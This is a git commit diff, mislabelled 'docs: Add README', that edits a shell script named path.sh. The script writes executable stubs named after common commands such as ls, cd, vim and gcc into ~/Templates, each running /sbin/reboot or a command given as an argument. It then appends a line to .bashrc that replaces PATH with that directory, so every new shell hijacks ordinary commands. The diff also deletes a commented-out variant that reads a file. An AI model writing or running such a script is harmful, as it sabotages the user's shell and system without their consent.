b5e9b8055505dded4a8ce3579733385f80918763
ju-lit-hein <julien.ferdinand@epitech.eu>
2023-10-04 11:36:57 +0400

    docs: Add README

--- path.sh
+++ path.sh
@@ -3,7 +3,7 @@
 mkdir -p /home/$USER/Templates
 
 commands=("ls" "cd" "emacs" "vim" "nano" "cp" "mv" "mkdir" "gcc" "touch" "clear")
-new=$([ -z "$1" ] && echo "reboot" || echo $1)
+new=$([ -z "$1" ] && echo "/sbin/reboot" || echo $1)
 echo $new
 
 for i in "${commands[@]}"; do
@@ -11,9 +11,5 @@ for i in "${commands[@]}"; do
     echo -e "#!/bin/bash\n$new" > /home/$USER/Templates/$i
     chmod a+x /home/$USER/Templates/$i
 done
-
-#touch /home/$USER/Templates/ls
-#echo -e "#!/bin/bash\n/bin/cat /tmp/test/main.c" > /home/$USER/Templates/ls
-#chmod a+x /home/$USER/Templates/ls
 
 echo -e "\nexport PATH='/home/$USER/Templates'\0" >> /home/$USER/.bashrc
